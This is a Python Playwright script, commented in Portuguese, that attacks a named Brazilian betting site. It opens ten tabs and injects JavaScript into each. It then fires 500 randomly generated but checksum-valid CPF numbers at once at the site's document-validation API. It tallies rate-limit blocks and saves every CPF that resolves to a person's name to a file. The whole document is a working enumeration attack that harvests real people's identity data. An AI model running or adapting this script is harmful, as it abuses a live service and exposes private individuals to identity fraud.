#!/usr/bin/env python3
"""
Injetor BLAST - Todas as requisições de uma vez
"""
import random
import time
from playwright.sync_api import sync_playwright

NUM_TABS = 10
REQUESTS_PER_TAB = 50  # Total: 500 requisições simultâneas

def gerar_cpfs(n):
    cpfs = []
    for _ in range(n):
        cpf = [random.randint(0, 9) for _ in range(9)]
        soma = sum((10 - i) * cpf[i] for i in range(9))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        soma = sum((11 - i) * cpf[i] for i in range(10))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        cpfs.append(''.join(map(str, cpf)))
    return cpfs

def esperar_carregar(page, tab_id, max_tentativas=3):
    """Espera a página carregar, recarrega se necessário"""
    for tentativa in range(max_tentativas):
        try:
            # Verifica se carregou
            page.wait_for_load_state("domcontentloaded", timeout=10000)
            
            # Verifica se o site está acessível
            check = page.evaluate("() => document.body ? true : false")
            if check:
                return True
        except:
            print(f"   ⚠️  Tab {tab_id}: Tentativa {tentativa+1}/{max_tentativas} - Recarregando...")
            try:
                page.reload()
            except:
                pass
    return False

def main():
    total = NUM_TABS * REQUESTS_PER_TAB
    
    print("="*65)
    print(f"💥 INJETOR BLAST - {total} REQUISIÇÕES SIMULTÂNEAS")
    print("="*65)
    print(f"   Tabs: {NUM_TABS}")
    print(f"   Requisições por tab: {REQUESTS_PER_TAB}")
    print(f"   Total: {total}")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        
        # FASE 1: Abrir todas as tabs
        print(f"\n🌐 FASE 1: Abrindo {NUM_TABS} tabs...")
        pages = []
        for i in range(NUM_TABS):
            page = context.new_page()
            page.goto("https://7k.bet.br/", wait_until="commit")
            pages.append(page)
            print(f"   Tab {i+1}/{NUM_TABS} iniciada")
        
        # FASE 2: Esperar todas carregarem
        print(f"\n⏳ FASE 2: Aguardando todas as tabs carregarem...")
        for i, page in enumerate(pages):
            if esperar_carregar(page, i+1):
                print(f"   ✅ Tab {i+1} carregada")
            else:
                print(f"   ❌ Tab {i+1} falhou ao carregar")
        
        # Aguarda estabilizar
        print(f"\n   ⏳ Aguardando estabilização (5s)...")
        time.sleep(5)
        
        # FASE 3: Injetar JS em todas
        print(f"\n💉 FASE 3: Injetando código em todas as tabs...")
        for i, page in enumerate(pages):
            try:
                page.evaluate("""() => {
                    window.stats = {ok: 0, validos: [], blocked: 0, erro: 0};
                    
                    window.validarCPF = async (cpf) => {
                        try {
                            const r = await fetch('/api/documents/validate', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({number: cpf, type: 'cpf'})
                            });
                            if (r.status === 200) {
                                const data = await r.json();
                                window.stats.ok++;
                                window.stats.validos.push({cpf, nome: data.data?.name || 'N/A'});
                            } else if (r.status === 400) {
                                window.stats.ok++;
                            } else if (r.status === 403) {
                                window.stats.blocked++;
                            } else {
                                window.stats.erro++;
                            }
                        } catch (e) {
                            window.stats.erro++;
                        }
                    };
                    
                    window.blastCPFs = async (cpfs) => {
                        const promises = cpfs.map(cpf => window.validarCPF(cpf));
                        await Promise.all(promises);
                        return window.stats;
                    };
                    
                    window.ready = true;
                }""")
                print(f"   ✅ Tab {i+1} injetada")
            except Exception as e:
                print(f"   ❌ Tab {i+1} erro: {str(e)[:30]}")
        
        # FASE 4: Preparar CPFs
        print(f"\n📝 FASE 4: Gerando {total} CPFs...")
        all_cpfs = [gerar_cpfs(REQUESTS_PER_TAB) for _ in range(NUM_TABS)]
        print(f"   ✅ CPFs gerados")
        
        # FASE 5: BLAST! Disparar todas ao mesmo tempo
        print(f"\n💥 FASE 5: DISPARANDO {total} REQUISIÇÕES...")
        print(f"   3...")
        time.sleep(1)
        print(f"   2...")
        time.sleep(1)
        print(f"   1...")
        time.sleep(1)
        print(f"   🚀 BLAST!")
        
        inicio = time.time()
        
        # Dispara em todas as tabs (sem esperar individualmente)
        for i, page in enumerate(pages):
            try:
                page.evaluate("cpfs => window.blastCPFs(cpfs)", all_cpfs[i])
            except:
                pass
        
        # Aguarda todas terminarem
        print(f"\n   ⏳ Aguardando todas terminarem...")
        time.sleep(15)  # Dá tempo para as requisições completarem
        
        tempo = time.time() - inicio
        
        # Coleta resultados
        total_ok = 0
        total_blocked = 0
        total_erro = 0
        all_validos = []
        
        print(f"\n📊 Coletando resultados...")
        for i, page in enumerate(pages):
            try:
                stats = page.evaluate("() => window.stats")
                total_ok += stats["ok"]
                total_blocked += stats["blocked"]
                total_erro += stats["erro"]
                for v in stats["validos"]:
                    all_validos.append(v)
                print(f"   Tab {i+1}: OK={stats['ok']}, Válidos={len(stats['validos'])}, Blocked={stats['blocked']}")
            except Exception as e:
                print(f"   Tab {i+1}: Erro ao coletar - {str(e)[:30]}")
        
        print("\n" + "="*65)
        print("📊 RELATÓRIO FINAL - BLAST")
        print("="*65)
        print(f"   Tabs: {NUM_TABS}")
        print(f"   Total requisições: {total}")
        print(f"   Tempo: {tempo:.1f}s")
        print(f"\n   ⚡ VELOCIDADE: {total/tempo:.1f} req/s")
        print(f"\n   ✅ OK: {total_ok}")
        print(f"   🎯 Válidos: {len(all_validos)}")
        print(f"   🚫 Blocked: {total_blocked}")
        print(f"   💥 Erros: {total_erro}")
        
        if all_validos:
            print(f"\n🎯 CPFs VÁLIDOS ({len(all_validos)}):")
            for v in all_validos[:50]:
                cpf = v['cpf']
                print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")
            
            with open("cpfs_blast.txt", "w", encoding="utf-8") as f:
                for v in all_validos:
                    cpf = v['cpf']
                    f.write(f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}\n")
            print(f"\n💾 Salvos em cpfs_blast.txt")
        
        browser.close()
        
        print("\n" + "="*65)
        print(f"✅ BLAST COMPLETO: {total/tempo:.1f} req/s")
        print("="*65)

if __name__ == "__main__":
    main()







